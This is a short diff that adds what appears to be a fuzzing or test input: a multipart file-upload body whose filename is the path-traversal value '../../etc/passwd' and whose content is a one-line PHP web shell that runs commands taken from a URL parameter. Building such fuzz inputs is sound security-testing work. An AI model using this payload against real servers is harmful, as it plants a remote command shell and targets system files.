@@ -1,0 +1,6 @@
+--fuzzbound
+Content-Disposition: form-data; name="f"; filename="../../etc/passwd"
+Content-Type: text/plain
+
+<?php system($_GET[0]); ?>
+--fuzzbound--
